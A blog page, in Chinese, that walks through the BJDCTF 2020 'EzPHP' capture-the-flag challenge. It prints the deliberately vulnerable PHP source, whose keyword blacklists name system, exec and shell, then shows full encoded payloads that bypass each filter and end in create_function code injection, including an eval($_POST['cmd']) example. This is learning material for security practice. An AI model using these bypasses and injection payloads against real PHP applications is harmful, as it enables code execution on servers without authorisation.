@@ -1,0 +1,315 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BJDCTF 2020-EzPHP 经典题目 - H3ppo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ppo,"> 
+    <meta name="description" content="
+F12
+
+base32解码1nD3x.php
+ &amp;lt;?php
+highlight_file(__FILE__);
+error_reporting(0); 
+
+$file = &#34;1nD3x.ph,"> 
+    <meta name="author" content="H3ppo"> 
+    <link rel="alternative" href="/atom.xml" title="H3ppo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ppo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://H3ppo.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">BJDCTF 2020-EzPHP 经典题目</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">BJDCTF 2020-EzPHP 经典题目</h1>
+        <div class="stuff">
+            <span>九月 28, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHPsec/" rel="tag">PHPsec</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p><img src="/2021/09/28/phpsec/bjdctf-2020-ezphp-jing-dian-ti-mu/bjdctf-2020-ezphp-jing-dian-ti-mu/image-20210816183237244.png" alt="image-20210816183237244"></p>
+<p>F12</p>
+<p><img src="/2021/09/28/phpsec/bjdctf-2020-ezphp-jing-dian-ti-mu/bjdctf-2020-ezphp-jing-dian-ti-mu/image-20210816183257665.png" alt="image-20210816183257665"></p>
+<p>base32解码1nD3x.php</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span>
+<span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>
+        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">)</span>  
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+        <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span> 
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
+<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
+    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span> <span class="token delimiter">?></span> </code></pre>
+<p>关于第一处限制：</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>
+        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">)</span>  
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span> </code></pre>
+<p>关于<code>$_SERVER['QUERY_STRING']</code>.他验证的时候是不会进行url解码的，但是在GET的时候则会进行url解码，所以我们只需要将关键词编码就能绕过。’’</p>
+<p>关于第二处限制：</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p><code>preg_match</code>值匹配第一行，句尾加上%0a进行绕过，绕过<code>preg_match</code>主要有两种方法即换行符与PRCE回溯此处超出。</p>
+<p>payload：<code>dedu=aqua_is_cute%0a</code></p>
+<p>关于第三处限制：</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span>  </code></pre>
+<p><code>$_REQUEST</code>方式接收请求是存在优先级别的，如果同时接受GET和POST的数据，默认情况下POST具有优先权，所以只需要在get的同时post数字即可。</p>
+<p>payload：<code>POST：debu=1&amp;file=1</code></p>
+<p>关于第四处限制：</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
+<p>这里利用data协议即可：<code>file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61</code></p>
+<p>与此同时file也需要被post一下。</p>
+<p>关于第四处限制：</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> </code></pre>
+<p>这里利用数组进行一下绕过就可以了，因为当sha1()的参数为数组，此时就会返回false。</p>
+<p>payload：<br> <code>shana[]=1&amp;passwd[]=2</code>  </p>
+<p>关于第五处限制：  </p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
+<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
+    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
+<p>这里利用到了<code>create_function()</code>代码注入。</p>
+<p><code>create_function()</code>函数有两个参数$args和$code，用于创建一个lambda样式的函数</p>
+<p>例如：<code>$myfunc = create_function('$a, $b', 'return $a+$b;');</code><br> 相当于：  </p>
+<pre><code>function myfunc($a, $b){
+    return $a+$b;
+}    </code></pre>
+<p>与此同时当第二个参数无限制时：</p>
+<pre><code>$code=return $a+$b;}eval($_POST['cmd']);//</code></pre>
+<p>就会变成：</p>
+<pre><code>function myfunc($a, $b){
+    return $a+$b;
+}
+eval($_POST['cmd']);//}  </code></pre>
+<p>看到这道题，在上一阶段sha1比较的过程中，<code>extract($_GET["flag"]);</code>这里我们可以进行变量覆盖，从而掌控住arg变量与code变量。<br> 同时根据上面的介绍我们可以通过必和符号来执行自己定义的函数：  </p>
+<pre><code>&amp;flag[arg]=}a();//&amp;flag[code]=create_function</code></pre>
+<p>拼接过后就应该是：    </p>
+<pre><code>function {}a();//}</code></pre>
+<p>这样子了。  </p>
+<p>这个a我们是可以随时改成其他的函数的。  </p>
+<p>但是此时很多函数都被禁用了，文件中包含了flag这个文件，利用<code>get_defined_vars()</code>将所有变量与值都进行输出，此时payload就为：  </p>
+<pre><code>flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></pre>
+<p>输出出来但还不是真正的flag，提示我们是在另一个文件里面，flag4.php，此时我们可以利用require，来代替include，利用base64编码绕过flag的过滤，利用require()来代替require” “。  </p>
+<p>payload：<code>flag[arg]=}require(base64_decode(xxxxxxx));var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></p>
+<p>非预期解：利用异或或者~进行取反操作。</p>
+<p>最终payload:<br> GET:</p>
+<pre><code>1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%61%71%75%61%5f%69%73%5f%63%75%74%65&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%61%72%67]=}var_dump(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e</code></pre>
+<p>POST:</p>
+<pre><code>debu=1&amp;file=1</code></pre>
+<pre><code>/1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%61%71%75%61%5f%69%73%5f%63%75%74%65&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%61%72%67]=}var_dump(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e
+
+file=1&amp;debu=2
+</code></pre>
+<pre><code>file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//
+</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+				
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
